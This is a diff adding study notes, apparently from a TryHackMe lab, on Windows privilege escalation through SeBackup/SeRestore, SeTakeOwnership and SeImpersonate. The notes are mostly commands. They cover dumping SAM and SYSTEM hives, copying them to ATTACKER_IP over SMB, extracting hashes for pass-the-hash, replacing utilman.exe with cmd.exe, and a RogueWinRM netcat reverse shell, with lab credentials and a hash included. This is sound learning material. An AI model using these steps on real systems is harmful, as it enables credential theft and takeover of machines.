@@ -1,0 +1,113 @@
+Windows Privileges:
+
+Check Users Privileges:
+    ->whoami /priv
+
+********SeBackup / SeRestore:************
+The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place
+
+
+C:\> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== ========
+SeBackupPrivilege             Back up files and directories  Disabled
+SeRestorePrivilege            Restore files and directories  Disabled
+SeShutdownPrivilege           Shut down the system           Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+
+
+
+Backup the SAM and SYSTEM hashes (his will create a couple of files with the registry hives content):
+-C:\> reg save hklm\system C:\Users\THMBackup\system.hive
+-C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
+
+We can now copy these files to our attacker machine using SMB or any other available method.
+For SMB, we can "smbserver.py" to start a simple SMB server with a network share in Kali 
+(This will create a share named public pointing to the share directory):
+-user@attackerpc$ mkdir share
+-user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
+
+use the copy command in our windows machine to transfer both files to our Kali:
+-C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
+-C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
+
+And use impacket to retrieve the users' password hashes:
+-user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
+
+Finally use the Administrator's hash to perform a Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges:
+-user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.117.86
+
+
+********SeTakeOwnership************
+
+C:\> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                              State
+============================= ======================================== ========
+SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
+
+
+We'll abuse "utilman.exe" to escalate privileges 
+
+To replace utilman, we will start by taking ownership of it with the following command:
+-takeown /f C:\Windows\System32\Utilman.exe
+
+To give your user full permissions over utilman.exe:
+-icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
+
+After this, we will replace utilman.exe with a copy of cmd.exe:
+-copy cmd.exe utilman.exe
+
+In case of "Access Denied" Check the Permissions of utilman.exe:
+-icacls C:\Windows\System32\Utilman.exe -> Tre to Find if (F) access is enabled
+
+If Priviledges == :
+-copy cmd.exe utilman.exe
+
+After launch utilman.exe:
+-cd C:\Users\Administrator\Desktop
+-dir
+-type flag.txt
+
+
+********SeImpersonate / SeAssignPrimaryToken************
+We will use RogueWinRM exploit to accomplish both conditions.
+
+Let's start by assuming we have already compromised a website running on IIS and that we have planted a web shell on the following address:
+http://MACHINE_IP/
+
+-whoami /priv
+
+Search for "SeAssignPrimaryTokenPrivilege" and "SeImpersonatePrivilege"
+
+
+To use RogueWinRM, we first need to upload the exploit to the target machine in the C:\tools\ folder:
+The RogueWinRM exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, 
+it automatically creates a connection to port "5985" using SYSTEM privileges. Port "5985" is typically used for the WinRM service, 
+
+*It's a SSH like, but using Powershell.
+
+If, for some reason, the WinRM service isn't running on the victim server, 
+We can can start a fake WinRM service on port 5985 and catch the authentication attempt made by the BITS service when starting. 
+
+If We Have "SeImpersonate" privileges, we can execute any command on behalf of the connecting user, which is SYSTEM.
+
+Before running the exploit, we'll start a netcat listener to receive a reverse shell on our Kaloi machine:
+-user@attackerpc$ nc -lvp 4442
+
+And then, use our web shell to trigger the RogueWinRM exploit using the following command:
+-c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
+
+p parameter specifies the executable to be run by the exploit
+The -a parameter is used to pass arguments to the executable. 
+The arguments to pass to netcat will be -e cmd.exe ATTACKER_IP 4442.
